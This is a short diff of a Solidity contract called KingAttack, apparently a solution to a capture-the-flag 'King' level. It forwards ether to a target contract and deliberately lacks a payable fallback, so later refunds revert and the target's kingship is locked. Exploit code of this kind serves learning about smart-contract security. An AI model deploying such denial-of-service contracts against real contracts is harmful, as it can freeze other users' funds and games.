@@ -1,11 +1,10 @@
-pragma solidity ^0.5.0;
+pragma solidity ^0.4.18;
 
 
 contract KingAttack {
 
   function doYourThing(address _target) public payable {
-    (bool result, bytes memory data) = _target.call.value(msg.value)("");
-    if(!result) revert();
+    if(!_target.call.value(msg.value)()) revert();
   }
 
   // OMG NO PAYABLE FALLBACK!!
